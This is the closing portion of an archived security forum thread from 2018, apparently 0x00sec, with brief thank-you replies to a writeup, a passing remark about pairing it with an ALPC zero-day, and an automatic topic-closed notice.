              <p>Awesome writeup dude, now can mix with ALPC recent 0day to privesc quickly <img src="../../../0x00sec.org/images/emoji/twitter/winkc164.html?v=9" title=":wink:" class="emoji" alt=":wink:"></p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_6' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-08-29T15:06:13Z' class='post-time'>
                    August 29, 2018,  3:06pm
                  </time>
                  <meta itemprop='dateModified' content='2018-08-29T15:06:13Z'>
              <span itemprop='position'>6</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thanks man! Please show me when you have that, perhaps even write an article?</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
          <div id='post_7' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/hiepdang.html'><span itemprop='name'>hiepdang</span></a>
                (Hiep Dang)
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-08-29T16:17:41Z' class='post-time'>
                    August 29, 2018,  4:17pm
                  </time>
                  <meta itemprop='dateModified' content='2018-08-29T16:17:41Z'>
              <span itemprop='position'>7</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>Thanks for nice tutorial!</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="1" />
              <span class='post-likes'>1 Like</span>
            </div>


            
          </div>
          <div id='post_8' itemprop='comment' itemscope itemtype='http://schema.org/Comment' class='topic-body crawler-post'>
            <div class='crawler-post-meta'>
              <span class="creator" itemprop="author" itemscope itemtype="../../../external.html?link=http://schema.org/Person">
                <a itemprop="url" rel='nofollow' href='../../u/pry0cc.html'><span itemprop='name'>pry0cc</span></a>
                (Leader &amp; Offsec Engineer &amp; Forum Daddy)
                  Closed 
              </span>



              <span class="crawler-post-infos">
                  <time itemprop='datePublished' datetime='2018-09-20T14:19:45Z' class='post-time'>
                    September 20, 2018,  2:19pm
                  </time>
                  <meta itemprop='dateModified' content='2018-09-20T14:19:45Z'>
              <span itemprop='position'>8</span>
              </span>
            </div>
            <div class='post' itemprop='text'>
              <p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
            </div>

            <div itemprop="interactionStatistic" itemscope itemtype="../../../external.html?link=http://schema.org/InteractionCounter">
              <meta itemprop="interactionType" content="../../../external.html?link=http://schema.org/LikeAction"/>
              <meta itemprop="userInteractionCount" content="0" />
              <span class='post-likes'></span>
            </div>


            
          </div>
    </div>


    




    </div>
    <footer class="container wrap">
  <nav class='crawler-nav'>
    <ul>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../index.html' itemprop="url">Home </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../categories.html' itemprop="url">Categories </a>
        </span>
      </li>
      <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
        <span itemprop='name'>
          <a href='../../guidelines.html' itemprop="url">Guidelines </a>
        </span>
      </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../tos.html' itemprop="url">Terms of Service </a>
          </span>
        </li>
        <li itemscope itemtype='../../../external.html?link=http://schema.org/SiteNavigationElement'>
          <span itemprop='name'>
            <a href='../../privacy.html' itemprop="url">Privacy Policy </a>
          </span>
        </li>
    </ul>
  </nav>
  <p class='powered-by-link'>Powered by <a href="../../../external.html?link=https://www.discourse.org/">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>

    
    <script src="../../../external.html?link=http://instant.page/3.0.0" type="module" defer="" integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1" nonce="bcnANTm0KZAW0q2tJwviJgNep"></script>
  </body>
  
</html>
